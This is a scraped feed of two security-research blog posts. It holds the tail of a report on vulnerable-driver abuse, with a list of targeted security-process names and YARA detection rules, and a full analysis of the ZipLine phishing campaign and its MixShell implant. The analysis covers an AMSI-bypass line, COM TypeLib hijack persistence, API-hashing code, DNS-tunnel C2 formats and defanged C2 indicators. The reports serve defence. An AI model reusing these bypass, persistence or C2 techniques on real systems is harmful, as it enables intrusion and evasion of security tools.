vendors and users to stay vigilant against the emerging abuse of legitimate drivers. Proactive identification, reporting, and patching of these vulnerabilities are critical to strengthening Windows systems against evolving threats leveraging Bring Your Own Vulnerable Driver (BYOVD) techniques.\nCheck Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, filetypes, and operating systems and protect against the attacks and threats described in this report.\nCPR – Breaking Boundaries: Investigating Vulnerable Drivers and Mitigating Risks: https://research.checkpoint.com/2024/breaking-boundaries-investigating-vulnerable-drivers-and-mitigating-risks/\nCPR – Silent Killers: Unmasking a Large-Scale Legacy Driver Exploitation Campaign: https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/\nLOLDrivers: https://github.com/magicsword-io/LOLDrivers\nMicrosoft Vulnerable Driver Blocklist: https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules\nTerminator PoC: https://github.com/ZeroMemoryEx/Terminator\nReverse Engineering Zemana AntiMalware/AntiLogger Driver: https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/\nWatchdog Anti-Malware product: https://watchdog.com/solutions/anti-malware/\nZemana Anti-Malware SDK: https://zemana.com/us/sdk.html\nDevice Characteristics: https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-characteristics\nUPX – the Ultimate Packer for eXecutables: https://github.com/upx/upx\nSplunk – ValleyRAT Insights: https://www.splunk.com/en_us/blog/security/valleyrat-insights-tactics-techniques-and-detection-methods.html\nZscaler – Technical Analysis of ValleyRAT: https://www.zscaler.com/blogs/security-research/technical-analysis-latest-variant-valleyrat\nMalpedia ValleyRAT: https://malpedia.caad.fkie.fraunhofer.de/details/win.valley_rat\nNotice that most of the targeted processes are associated with security solutions typically deployed in China or the Asia region.\n2345AdRtProtect.exe 2345Associate.exe 2345AuthorityProtect.exe 2345ExtShell.exe 2345ExtShell64.exe 2345FileShre.exe 2345HipsSet.exe 2345InstDll.exe 2345LSPFix.exe 2345LeakFixer.exe 2345MPCSafe.exe 2345ManuUpdate.exe 2345NetFlow.exe 2345NetRepair.exe 2345NightMode.exe 2345PCSafeBootAssistant.exe 2345ProtectManager.exe 2345RTProtect.exe 2345RtProtectCenter.exe 2345SFGuard.exe 2345SFGuard64.exe 2345SFWebShell.exe 2345SafeCenterCrashReport.exe 2345SafeCenterInstaller.exe 2345SafeCenterSvc.exe 2345SafeCenterUpdate.exe 2345SafeLock.exe 2345SafeSvc.exe 2345SafeTray.exe 2345SafeUpdate.exe 2345ScUpgrade.exe 2345Setting.exe 2345ShellPro.exe 2345ShortcutArrow.exe 2345SoftMgr.exe 2345SoftmgrDaemon.exe 2345SoftmgrSvc.exe 2345SysDoctor.exe 2345TrashRcmd.exe 2345Uninst.exe 2345UsbGuard.exe 2345VirusScan.exe 360AI.exe 360FileGuard.exe 360QMachine.exe 360Restore.exe 360Safe.exe 360SkinMgr.exe 360huabao.exe 360leakfixer.exe 360netcfg.exe 360netcfg64.exe 360realpro.exe 360rp.exe 360rps.exe 360sd.exe 360sdSetup.exe 360sdToasts.exe 360sdrun.exe 360sdsf.exe 360sdupd.exe 360speedld.exe 360tray.exe BGADefMgr.exe BrowserPrivacyAndSecurity.exe CertImporter-1684.exe Client.exe ConfigSecurityPolicy.exe DSMain.exe DlpUserAgent.exe DumpUper.exe Fetion.exe HipsDaemon.exe HipsMain.exe HipsTray.exe MSPCManager.exe MSPCManagerCore.exe MSPCManagerService.exe MipDlp.exe MpCmdRun.exe MpCopyAccelerator.exe MpDlpCmd.exe MpDlpService.exe MsMpEng.exe MultiTip.exe NewIDView.exe NisSrv.exe PCMAutoRun.exe QMAIService.exe QMDL.exe QMFloatWidget.exe QQPCExternal.exe QQPCMgrUpdate.exe QQPCPatch.exe QQPCRTP.exe QQPCSoftCmd.exe QQPCSoftMgr.exe QQPCTray.exe QQRepair.exe RMenuMgr.exe SecurityHealthHost.exe SecurityHealthService.exe SysCleanProService.exe SysInspector.exe VolSnapshotX64.exe ZhuDongFangYu.exe activeconsole anti-malware antimalware avpia.exe avpvk.exe callmsi.exe eCapture.exe eComServer.exe ecls.exe ecmd.exe ecmds.exe eeclnt.exe egui.exe eguiProxy.exe feedback.exe feedbackwin.exe kailab.exe kassistant.exe kassistsetting.exe kauthorityview.exe kavlog2.exe kcddltool.exe kcleaner.exe kcrm.exe kctrlpanel.exe kdf.exe kdinfomgr.exe kdownloader.exe kdrvmgr.exe kdumprep.exe kdumprepn.exe keyemain.exe kfixstar.exe kfloatmain.exe khealthctrlspread.exe kinst.exe kintercept.exe kislive.exe kismain.exe kldw.exe kmenureg.exe knewvip.exe knotifycenter.exe krecycle.exe kscan.exe kschext.exe kscrcap.exe ksetupwiz.exe kslaunch.exe kslaunchex.exe ksoftmgr.exe ksoftmgrproxy.exe ksoftpurifier.exe kteenmode.exe ktrashautoclean.exe kupdata.exe kwebx.exe kwsprotect64.exe kwtpanel.exe kxecenter.exe kxemain.exe kxescore.exe kxetray.exe kxewsc.exe mpextms.exe packageregistrator.exe plugins-setup.exe plugins_nms.exe qmbsrv.exe rcmdhelper.exe rcmdhelper64.exe remove_incompatible_applications.exe restore_tool.exe safesvr.exe securityhealthsystray.exe smartscreen.exe sysissuehat.exe troubleshoot.exe uni0nst.exe uninstallation_assistant_host.exe upgrade.exe vssbridge64.exe webx.exe webx_helper.exe wmiav.exe wsctrlsvc.exe\nAll-in-one self-contained loaders:\nC2 Servers (ValleyRAT/Winos):\nVulnerable drivers abused in the campaign:\nAll of them are based on the Zemana Anti-Malware SDK.\nDetects 64-bit, valid-signed WatchDog Antimalware driver, amsdk.sys\n, version 1.0.600 (bypassing LOLDrivers and Microsoft Vulnerable Driver Blocklist):\nimport \"pe\" rule watchdog_antimalware_driver_64bit_ver10600 { meta: description = \"Detects 64-bit, valid-signed WatchDog Antimalware driver, version 1.0.600\" author = \"Jiri Vinopal @ Check Point Research\" hash = \"12b3d8bc5cc1ea6e2acd741d8a80f56cf2a0a7ebfa0998e3f0743fcf83fabb9e\" condition: // Detect PE uint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and // Detect 64-bit Windows drivers uint16(uint32(0x3C) + 0x5c) == 0x0001 and uint16(uint32(0x3C) + 0x18) == 0x020b and // Detect OriginalFilename \"amsdk.sys\" and FileVersion \"1.0.600\" pe.version_info[\"OriginalFilename\"] == \"amsdk.sys\" and pe.version_info[\"FileVersion\"] == \"1.0.600\" and // Detect only signed drivers, not a real verification pe.number_of_signatures > 0 and for all i in (0..pe.number_of_signatures -1): (pe.signatures[i].verified) }\nDetects 64-bit, valid-signed WatchDog Antimalware Driver, wamsdk.sys\n, version 1.1.100 (bypassing LOLDrivers and Microsoft Vulnerable Driver Blocklist):\nimport \"pe\" rule watchdog_antimalware_driver_64bit_ver11100 { meta: description = \"Detects 64-bit, valid-signed WatchDog Antimalware driver, version 1.1.100\" author = \"Jiri Vinopal @ Check Point Research\" hash = \"5af1dae21425dda8311a2044209c308525135e1733eeff5dd20649946c6e054c\" hash = \"0be8483c2ea42f1ce4c90e84ac474a4e7017bc6d682e06f96dc1e31922a07b10\" condition: // Detect PE uint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and // Detect 64-bit Windows drivers uint16(uint32(0x3C) + 0x5c) == 0x0001 and uint16(uint32(0x3C) + 0x18) == 0x020b and // Detect OriginalFilename \"wamsdk.sys\" and FileVersion \"1.1.100\" pe.version_info[\"OriginalFilename\"] == \"wamsdk.sys\" and pe.version_info[\"FileVersion\"] == \"1.1.100\" and // Detect only signed drivers, not a real verification pe.number_of_signatures > 0 and for all i in (0..pe.number_of_signatures -1): (pe.signatures[i].verified) }\nDetects 64-bit, valid-signed Advanced Malware Protection driver, ZAM.exe\n, version 3.0.0.000 (detected by LOLDrivers and Microsoft Vulnerable Driver Blocklist):\nimport \"pe\" rule zam_advanced_malware_protection_driver_64bit_ver300000 { meta: description = \"Detects 64-bit, valid-signed Advanced Malware Protection driver, version 3.0.0.000\" author = \"Jiri Vinopal @ Check Point Research\" hash = \"9c394dcab9f711e2bf585edf0d22d2210843885917d409ee56f22a4c24ad225e\" condition: // Detect PE uint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and // Detect 64-bit Windows drivers uint16(uint32(0x3C) + 0x5c) == 0x0001 and uint16(uint32(0x3C) + 0x18) == 0x020b and // Detect OriginalFilename \"ZAM.exe\" and FileVersion \"3.0.0.000\" pe.version_info[\"OriginalFilename\"] == \"ZAM.exe\" and pe.version_info[\"FileVersion\"] == \"3.0.0.000\" and // Detect only signed drivers, not a real verification pe.number_of_signatures > 0 and for all i in (0..pe.number_of_signatures -1): (pe.signatures[i].verified) }", "timestamp": "2025-10-21T13:36:03.296732"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies", "url": "https://research.checkpoint.com/2025/zipline-phishing-campaign/", "published": "Tue, 26 Aug 2025 12:57:45 +0000", "content": "Check Point Research (CPR) has been closely monitoring the activity of a highly persistent and sophisticated threat actor who leverages social engineering tactics to gain the trust of targeted U.S.-based organizations. While analyzing the phishing lures used by the actors, we repeatedly noticed an intriguing pattern: in every case, it was the victim who initiated the email exchange that ultimately led to infection. This unusual detail prompted a deeper investigation, which revealed an elaborate and highly resourceful phishing campaign.\nThis campaign, which we named ZipLine, the attackers diverge from traditional phishing methods by initiating contact through the victim’s own “Contact Us” web form. The targeted company naturally responds via email to the form submission, lending the interaction an immediate sense of legitimacy. This reversal of the typical phishing pathway is followed by a carefully orchestrated email conversation, often lasting two weeks, between the attackers and the unsuspecting victim, in which the attackers pose as a potential business partner and request the signing of a Non-Disclosure Agreement (NDA).\nOnce trust is established, the attackers deliver a ZIP archive hosted on a trusted platform. Embedded within the archive is a malicious .lnk file that triggers a PowerShell-based loader, ultimately deploying MixShell, a custom in-memory implant featuring a DNS based command and control (C2) and enhanced persistence mechanisms.\nIn this report, we examine the structure of the ZipLine campaign, explore the tactics that make it particularly deceptive, and provide a technical deep dive into MixShell.\nIn all the incidents we analyzed, the attacker initiates contact through a third party channel, most likely a “Contact Us” form found on the target company’s website. The targeted company naturally responds to this overture via email, reversing the usual attacker-initiated communication pattern, lowering suspicion, and avoiding reputation-based detection mechanisms.\nIn some cases, the actor exchanges emails with the victim for up to two weeks, discussing scheduling a meeting before ultimately sending a malicious ZIP file. This extended interaction helps the attackers bypass email protection mechanisms and build additional trust with the victim organization.\nFigure 1 – The attackers’ message submitted on the company’s “Contact Us” form.\nAfter receiving the form submission, the company typically replies to confirm receipt and may ask follow-up questions or offer to schedule a call. The attacker maintains a convincing dialogue, building rapport with the victim over time.\nFigure 2 – Social engineering flow of the ZipLine campaign.\nIn all observed cases, the malicious link sent by the attackers pointed to a subdomain of herokuapp.com\n. Heroku is a legitimate Platform-as-a-Service (PaaS) providing compute and storage infrastructure for hosting web applications. In this campaign, the threat actors abuse the platform to host and deliver the weaponized ZIP archive. The use of a trusted and commonly used domain may help the attackers reduce victims’ suspicions.\nCheck Point Research notified Heroku of the malicious content that the attackers hosted on their platform.\nFigure 3 – Delivery of the malicious NDA ZIP file.\nWhile finalizing this publication, we observed a new wave of phishing emails associated with the ZipLine campaign, centered around an AI transformation pretext. In this variation, the attacker claims to be working with the target’s organization to help implement AI-driven operational changes aimed at reducing costs and improving efficiency.\nThe email is positioned as an internal initiative and framed as an “AI Impact Assessment”, asking the recipient to review a short questionnaire about how artificial intelligence might affect their team’s workflows. To increase legitimacy and urgency, the attacker explicitly states that the company’s leadership requested the recipient’s personal input, implying that their opinion will influence upcoming decisions.\nAt this stage, the payload used in this AI-themed variant has not yet been observed. However, based on the attacker’s continued use of previously established infrastructure, we assess with high confidence that it is likely to follow a similar delivery model as seen in earlier stages of the ZipLine campaign—potentially involving staged delivery, a weaponized ZIP archive, and in-memory execution of a backdoor such as MixShell.\nFigure 4 – AI-Themed Phishing Email Used in ZipLine Campaign\nThe archive contains three files: Legitimate PDF and DOCX files used as lures, and a malicious LNK file responsible for initiating the execution chain. The ZIP archive itself contains a PowerShell script embedded directly within its binary content, which is later extracted and executed in memory by the .lnk\n-initiated payload.\nInterestingly, not all the ZIP files observed in this campaign were malicious. In several cases, the archive contained only harmless documents, with no embedded scripts or active payloads. This suggests that the malicious content may be dynamically served from the Herokuapp-hosted delivery domain, with the payload customized in real time based on factors such as the recipient’s IP address, user-agent, or other contextual indicators.\nThe LNK file executes a PowerShell command that performs several coordinated actions:\nDesktop\nDownloads\nDocuments\nTemp\nProgramData\nParent of current working dir\nxFIQCV\n). This marker is used to identify the start of the embedded PowerShell payload within the ZIP’s binary data.ProgramData\nfolder and extracts it there..docx\nfile to maintain the appearance of legitimacy.System.Management.Automation.AmsiUtils.amsiInitFailed = $true,\nwhich tricks AMSI into thinking it failed to initialize.After the embedded PowerShell script is extracted and executed, it first substitutes placeholder values with the actual script file path and the .lnk\nshortcut path.\nNext, the script establishes persistence using the TypeLib hijacking technique. The TypeLib registry hive, which stores metadata about COM objects and their associated CLSIDs, is modified to target the CLSID {EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\n, an identifier tied to Microsoft Web Browser components. The script assigns this CLSID to point to a local file named Udate_Srv.sct\n.\nThis .sct\nfile is created by the PowerShell script and populated with a malicious XML scriptlet. The scriptlet content, originally Base64-encoded, is decoded and written to disk with the script:\nmoniker. This COM-specific mechanism instructs Windows to interpret and execute the script content when the associated COM object is invoked.\nAs a result, the malicious code executes automatically whenever the hijacked COM object is accessed, by launching Internet Explorer, or by another application embedding IE components, or even by a system process that indirectly calls into that COM functionality. Notably, Windows Explorer (explorer.exe\n) triggers this COM object during normal operation. This means the payload will execute on every system restart without any manual user action, helping it to maintain long-term persistence.\nThe injected scriptlet contains JScript code that checks if the malware’s .lnk\nshortcut (which launches the primary payload) is already running. It queries if a process contains “cmd.exe” and if the command line contains the “/K” switch. If not found, the script assumes that the payload is not active. Therefore, it creates a shell and runs the command cmd.exe /K set X=1&{cmd}\nwhile {cmd} is the .lnk\nfile.\nThe malware’s .lnk\nfile will be re-executed automatically whenever the hijacked COM object is triggered, even if the payload was terminated. This ensures persistence and reactivation without any user action.\nAfter establishing persistence, the PowerShell script checks the system architecture (32-bit or 64-bit) and selects the corresponding shellcode. This shellcode is stored in the script as a Base64-encoded blob encrypted via XOR with a hardcoded key.\nThe script then uses reflection and the System.Reflection.Emit\nAPI to dynamically construct custom .NET delegate types at runtime. This enables it to resolve module handles, locate function pointers via GetProcAddress\n, and bind these unmanaged functions directly to delegates. All of this takes place in the memory, leaving minimal forensic traces on the disk. Using this approach, the script allocates executable memory with VirtualAlloc\n, copies the decrypted shellcode and invokes it directly, enabling it to execute the payload without dropping any additional files to disk.\nMixShell begins execution by dynamically locating required Windows API functions and storing their addresses in the shellcode’s main runtime structure. Instead of embedding plain API names, it uses a custom ROR4 hashing algorithm to identify them.\nThe hashing routine works as follows:\ndef api_hash(s): v1 = 0 for c in s: ch = ord(c) if 'a' <= c <= 'z': ch -= 32 # convert to uppercase v2 = ror4(v1, 13) v1 = (v2 + ch) & 0xFFFFFFFF return v1 def ror4(val, r_bits, max_bits=32): return ((val >> r_bits) | (val << (max_bits - r_bits))) & (2**max_bits - 1)\nAfter all necessary API addresses are resolved, MixShell parses its configuration block, which is stored immediately after the shellcode’s code section.\nEach configuration value is:\nEarlier variants stored this configuration in plaintext, indicating that the developers are actively evolving the malware to evade detection.\nThe decoded configuration provides critical operational parameters:\nSTRING[] dns_domain_name STRING[] communication_xor_key STRING[] lure_file_name STRING[] base64_string STRING[] prepend_value STRING[] append_value STRING[][4] libraries STRING[] current_version_reg_string STRING[] product_id_string STRING[] install_date_string STRING[] volume STRING[] verb STRING[] payload_default_file_name STRING[] pipe_process_name STRING[] cleanup_command_line STRING[] scheme STRING[] http_domain STRING[] config_xor_key\nThese values, together with the resolved API pointers, are centralized within MixShell’s runtime structure.\nTo ensure only one instance is active per host, MixShell creates a mutex whose name also doubles as its C2 identifier, which effectively fingerprints each infection to a specific machine. This name is generated as:\nhex(100 + ProductId + InstallDate + SerialNumber)\nMixShell prefers to communicate with its C2 using DNS TXT record queries. The DNS subdomain format:\n<prepend><hex(comm_key[0] ^ base64_str[0])><append>.<id_hex>.<time_hex>.<domain>\nFor example, with:\nul\n44\nmg\nThe generated subdomain is ul44mg\n.\nEach outbound request is a DNS TXT query. C2 responses follow the reverse process:\nIf six consecutive DNS requests fail, MixShell falls back to HTTP while retaining the same encryption and data wrapping format for consistency.\nDue to the 60-character maximum subdomain length enforced by MixShell, data sent to the C2 is chunked into smaller queries. The end of a message is marked by the append value in the subdomain, which allows the C2 to determine when transmission is complete. All outbound data is prefixed with the command ID before being encoded and transmitted.\nThe implant supports a wide range of commands, from basic file operations to interactive reverse proxy shells:\nWhen Command 8 is invoked, MixShell follows this handshake sequence:\ntype1=0\n, type2=0x33\n, \"mix-socks-<hex_id>\"\n).type2=0x33\n).type1=0\n, type2=0x53\n).type2=0x77\n) indicating:\n00000001\n→ New IP/port00000003\n→ New domaintype2 != 0x77.\nThis design allows MixShell to function as a flexible relay, enabling attackers to pivot to internal networks while seemingly blending in with legitimate network activity.\nDuring our research, we identified a PowerShell-based variant of MixShell.\nWhile its encryption routine (hex-encoded bytes + XOR) and overall infection flow (triggered after the same marker value in the ZIP file) are the same as in the shellcode version, this variant introduces several notable differences:\nwindbg\n, ida\n, wireshark\n, procmon\n, ollydbg\n, and immunity debugger\n.\\\\cuckoo\n, \\\\hgfs\n, \\\\vmci\n, \\\\vbox\n.qemu\n, virtual\n, vbox\n, vmware\n, xen\n.ProductID\nas the victim ID.conhost.exe\nto execute the malware.<prepend><data_chunk><append>.<crc32(ProductID)><crc16(encoded_lurename)><modecode><time_hex>.<domain>\ncmd.exe\n, it can execute commands directly via PowerShell.The domains used by the threat actors to initiate email communication appear to be carefully selected for credibility and legitimacy. Many of these domains match the names of LLCs registered in U.S-based companies and in some cases, may have previously belonged to legitimate businesses.\nHowever, a closer inspection of the websites hosted on these domains reveals that they are entirely fabricated. All the sites share identical content, layout, and structure, strongly suggesting they were cloned from a single template. Remarkably, the “About Us” pages across all domains display the same photograph of the supposed company founders – a stock image that, upon investigation, is a photo of White House butlers.\nFigure 10 – White house butlers image found in “About Us” page.\nSource: https://www.washingtonian.com/2014/06/26/meet-the-white-house-butlers-boss/\nFigure 11 – Side-by-side comparison of two of the websites.\nWhat stands out is that these domains were originally registered between 2015 and 2019, long before the ZipLine campaign began. By acquiring abandoned or dormant domains with legitimate business histories, the attackers significantly increased their chances of bypassing security filters and gaining the trust of targeted organizations. These aged domains benefit from long-standing DNS records, clean reputations, and business-sounding identities, making them highly effective for social engineering.\nThe first C2 domain we identified was tollcrm[.]com\n, which resolved to the name server IP address 172.210.58[.]69\n. Further analysis of this infrastructure revealed several additional domains associated with the same IP address, all linked to the same campaign and used for DNS tunneling-based C2 communication. These include:\nhumcrm[.]com\nvnrsales[.]com\natriocrm[.]com\nzappiercrm[.]com\nFurther examination of this server revealed what appears to be leftover or partially configured infrastructure, potentially representing components of a management interface. Among the artifacts was an empty database table, seemingly intended to store victim data, and a web-based panel containing functionality to execute commands, open reverse shells, or initiate file downloads using supplied URLs.\nWhile we cannot confirm active use of this panel in the current campaign, the presence of these components provides a rare glimpse into the attacker’s potential tooling and backend environment.\nOur analysis of the ZipLine phishing campaign reveals a diverse set of dozens of targeted organizations across multiple sectors, varying company sizes, and several geolocations, but with a clear emphasis on US-based entities. The majority of the targeted companies are in industrial manufacturing, including machinery, metalwork, component production, and engineered systems. Other affected industries include hardware & semiconductors, consumer goods & services, and biotech & pharmaceuticals. This distribution suggests that the attacker seeks entry points across wealthy operational and supply chain-critical industries instead of focusing on a specific vertical.\nThe inclusion of consumer electronics, aerospace, and energy companies, together with more traditional industrial targets, indicates the actors may be pursuing organizations with valuable proprietary data, strong vendor networks, or exploitable infrastructure.\nFigure 13 – Targeted companies by industry.\nThe campaign does not discriminate based solely on organizational size. While Enterprise-level companies make up the majority of identified targets, a significant portion of Small and Medium Businesses (SMBs) were also affected. Larger targets offer potential high-value opportunities, while smaller organizations present softer entry points with fewer security controls.\nFigure 14 – Targeted companies by size.\nThe long-term engagement with the victim (multi-week conversations) suggests that the attacker is willing to invest time cultivating the relationship regardless of company size, possibly tailoring their efforts based on perceived value or ease of compromise. More than 80% of the identified targets in this campaign are based in the United States, underscoring a clear geographic concentration, while also companies in Singapore, Japan and Switzerland were targeted. Overall, the engagement patterns observed were U.S-centric regarding infrastructure, communication style, and initial access points.\nThe campaign’s targets come from a wide range of sectors and the underlying motivations, aside from financial gain, remain unclear.\nHowever, during our infrastructure analysis, we identified overlapping certificates involving the IP address 172.210.58[.]69\n. This IP shares an SSL/TLS certificate with five other IP addresses. One of these, 162.33.179[.]82\n, hosts the domain mainstomp[.]cloud\n, which Zscaler previously reported in relation to the TransferLoader campaign. Subsequently, Proofpoint attributed this infrastructure to a cybercriminal cluster they track as “UNK_GreenSec.”\nWhile this overlap does not constitute definitive attribution, it does suggest a potential connection to financially motivated threat actors who may be reusing infrastructure or operating within the same ecosystem.\nIn this report, we analyzed ZipLine, a financially motivated phishing campaign that reflects the evolving tactics of advanced phishing campaigns. In a unique reversal of the typical phishing pipeline, the threat actors force the victims to make the initial contact. A business’s “Contact Us” form submission enables them to seamlessly integrate into legitimate business workflows, thereby weaponizing trust, patience, and legitimate services to evade suspicion. By using multi-stage payloads, in-memory execution, and DNS-based C2 channels, the campaign achieves both stealth and adaptability across its infection chain.\nFor defenders, ZipLine reminds them that inbound communication vectors, including seemingly benign channels like corporate web forms, can be exploited as initial access points. Traditional detection methods focused on single-message analysis are insufficient to protect against this threat.\nCheck Point Harmony Email & Collaboration provides proactive defense against advanced phishing and social-engineering campaigns like ZipLine. By analyzing communication context, sender reputation, and behavioral indicators, rather than relying on single-message analysis, Harmony Email and Collaboration detects attacks that unfold gradually over days or weeks. Its AI-driven phishing prevention, threat emulation for malicious attachments and ZIP archives, and real-time URL protection block the delivery of weaponized payloads before they reach users.\nHarmony Email and Collaboration also prevents account takeover and business email compromise through behavioral analysis, while data loss prevention safeguards sensitive IP and supply chain data from exfiltration. Together, these layers ensure organizations remain protected even when attackers exploit trusted channels such as corporate web forms or extended business correspondence.", "timestamp": "2025-10-21T13:36:03.928320"}
